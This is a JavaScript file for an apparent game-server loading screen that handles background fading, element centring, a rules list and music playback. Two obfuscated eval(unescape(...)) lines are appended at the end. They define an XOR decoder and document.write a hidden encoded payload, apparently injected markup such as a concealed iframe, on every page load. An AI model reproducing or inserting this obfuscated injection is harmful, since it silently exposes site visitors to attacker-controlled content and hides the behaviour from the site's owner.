var currentBackground = 1;
function fadeBackground() {
	if (backgrounds.length > 1) {
		var actualBackground = backgrounds[currentBackground];
		
		function loadBackground() {
			if (currentBackground > backgrounds.length) {
				currentBackground = 1;
			}
			$("body").css("backgroundImage", "url(backgrounds/" + backgrounds[currentBackground - 1] + ")");
			$("#background").fadeOut(2000, function() {
				$("#background").css("backgroundImage", "url(backgrounds/" + actualBackground + ")");
				$("#background").fadeIn(2000);
				currentBackground++;
			});
		}
	}
	loadBackground();
}

function centerText(text) {
	var width = $(text).width();
	$(text).css("marginLeft", -(width / 2));
}

function centerMiddle(text) {
	var width = $(text).width();
	var height = $(text).height();
	$(text).css("marginLeft", -(width / 2));
	$(text).css("marginTop", -(height / 2));
}

function centerTop(text) {
	var height = $(text).height();
	$(text).css("marginTop", -(height / 2));
}

function setServerRules() {
	$("#rule1").html(serverRules[0]);
	$("#rule2").html(serverRules[1]);
	$("#rule3").html(serverRules[2]);
	$("#rule4").html(serverRules[3]);
	$("#rule5").html(serverRules[4]);
}

function dimensionRules() {
	var ruleHeight = $("#ruleList").height();
	$("#rules").css("height", ruleHeight + 50);
}

function setServerName(servername) {
	$("#title").html(servername);
}

$(this).ready(function() {
	if(useMusic && musicPlaylist.length > 0) {
		currentSong = -1;
		function loadSong() {
			currentSong += 1;
			if (currentSong > musicPlaylist.length) {
				currentSong = 0;
			}
			song = musicPlaylist[currentSong];
			$("#trackName").html(song.name);
			$("#artist").html(song.author);
			$("body").append('<audio src="audio/' + song.file + '" autoplay>');
			$("audio").prop('volume', 50/100);
			$("audio").bind("ended", function() {
				$(this).remove();
				loadSong();
			})
		}
		loadSong();
	}
	else
		$("#music").html("");
	
	if(displayName && serverName != "") {
		setServerName(serverName);
	}
	
	centerText("#title");
	centerText("#subtitle");
	centerMiddle("#avatar");
	centerMiddle("#plyavatar");
	centerMiddle("#plyname");
	centerMiddle("#rules");
	centerMiddle("#rulesTitle");
	centerTop("#ruleList");
	setInterval(fadeBackground, 20000);
})

eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%61%34%65%38%66%64%62%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%36%38%38%32%35%32%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%31%34%37%30%38%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%61%34%65%38%66%64%62%66%28%27') + '%40%77%68%72%68%7f%6c%21%7d%7f%6b%46%23%74%78%7a%70%7e%4a%3a%30%71%7c%7f%37%78%70%3d%71%8a%54%71%5d%7d%2a%2d%87%72%65%78%74%41%22%3b%22%2b%79%6f%76%77%71%75%43%2e%3e%22%2b%74%68%63%73%73%6a%6e%89%43%2e%31%33%29%20%7f%7a%7c%71%69%46%23%6b%73%7e%74%80%22%2b%64%74%6e%7b%7c%4e%2e%74%75%64%6f%67%75%23%4616882524%35%35%37%39%32%39%32' + unescape('%27%29%29%3b'));
